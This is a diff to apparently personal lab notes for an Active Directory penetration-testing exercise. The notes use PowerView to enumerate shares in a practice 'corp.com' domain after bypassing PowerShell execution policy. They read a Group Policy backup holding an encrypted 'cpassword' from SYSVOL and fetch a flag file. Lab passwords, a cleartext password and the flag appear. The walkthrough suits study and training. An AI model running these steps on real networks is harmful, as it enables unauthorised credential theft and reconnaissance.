@@ -10,6 +10,12 @@ powershell -ep bypass
 cd C:\Tools
 Import-Module .\PowerView.ps1
 
+PS C:\Tools> Find-DomainShare
+...
+SYSVOL            0 Logon server share     DC1.corp.com
+
+...
+
 # We'll use PowerView's Find-DomainShare function to find the shares in the domain. We could also add the -CheckShareAccess flag to display shares only available to us
 PS C:\Tools> Find-DomainShare
 ...
@@ -52,6 +58,40 @@ The username I'm sure you already know, but here you have the brand new auto gen
 ...
 
 # According to the text in this file, jeff stored an email with a possible cleartext password: HenchmanPutridBonbon11! Although the password may have been changed, we will make a note of it in our documentation. Between this password and the password we discovered earlier, we're building a rough profile of the password policy used for both users and computers in the organization. We could use this to create specific wordlists that we can use for password guessing and brute force, if needed.
+
+Questions 2
+Start VM Group 2 and log in to CLIENT75 as stephanie. Use PowerView to locate the shares in the modified corp.com domain and enumerate them to obtain the flag.
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.173.75 
+Password: LegmanTeamBenzoin!!
+
+# Open powershell
+powershell -ep bypass
+cd C:\Tools
+Import-Module .\PowerView.ps1
+PS C:\Tools> Find-DomainShare
+...
+NETLOGON       0 Logon server share     DC1.corp.com
+SYSVOL         0 Logon server share     DC1.corp.com
+backup         0                        web04.corp.com
+docshare       0 Documentation purposes FILES04.corp.com
+Important Files  0                        FILES04.corp.com
+docshare       0 Documentation purposes FILES04.corp.com
+Important Files  0                        FILES04.corp.com
+sharing        0                        client75.corp.com
+...
+PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
+...
+          newName=""
+          fullName="admin"
+          description="Change local admin"
+          cpassword="+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
+...
+
+PS C:\Tools> ls \\files04.corp.com\"Important Files"\
+-a----         5/12/2024   5:28 AM             78 proof.txt
+PS C:\Tools> cat \\files04.corp.com\"Important Files"\proof.txt
+OS{35de01963b7345788a2d78be38db3e6e}
 
 
 
